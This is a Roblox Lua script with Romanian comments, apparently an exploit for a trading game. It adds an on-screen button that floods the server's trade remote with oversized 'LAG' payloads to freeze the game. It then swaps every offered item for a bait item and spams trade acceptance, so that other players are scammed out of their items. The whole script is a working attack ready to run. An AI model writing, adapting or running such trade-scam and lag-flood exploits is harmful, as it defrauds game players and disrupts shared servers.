-- [[ ULTIMA INCERCARE - MIHNEA & ELON ]] --
local remote = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_")
local momeala = "Quake-Quake" -- ASIGURA-TE CA AI QUAKE IN INVENTAR!

-- 1. CREĂM BUTONUL PE ECRAN (Să fim siguri că se execută)
local screenGui = Instance.new("ScreenGui", game.CoreGui)
local btn = Instance.new("TextButton", screenGui)
btn.Size = UDim2.new(0, 200, 0, 50)
btn.Position = UDim2.new(0.5, -100, 0.2, 0)
btn.Text = "FA MANEVRA ACUM!"
btn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
btn.TextColor3 = Color3.fromRGB(255, 255, 255)

-- 2. FUNCȚIA DE ATAC
btn.MouseButton1Click:Connect(function()
    print("🔥 LANSARE RACHETA!")
    btn.Text = "IN LUCRU..."
    btn.BackgroundColor3 = Color3.fromRGB(0, 255, 0)

    -- A. FREEZE TOTAL (Lag masiv)
    task.spawn(function()
        for i = 1, 600 do
            remote:InvokeServer("TradeUpdate", {["X"] = string.rep("LAG", 3000)})
            task.wait()
        end
    end)

    -- B. SCHIMBUL (Scoate tot, pune momeala)
    task.wait(0.2)
    for i = 1, 4 do remote:InvokeServer("RemoveItem", i) end
    task.wait(0.1)
    remote:InvokeServer("AddItem", momeala)

    -- C. AUTO-ACCEPT (Spam)
    for i = 1, 200 do
        remote:InvokeServer("TradeAccept")
        task.wait()
    end
    
    btn.Text = "MISIUNE GATA!"
    task.wait(2)
    btn.Text = "FA MANEVRA ACUM!"
    btn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
end)

print("✅ SCRIPTUL E PE ECRAN, MIHNEA! Succes!")
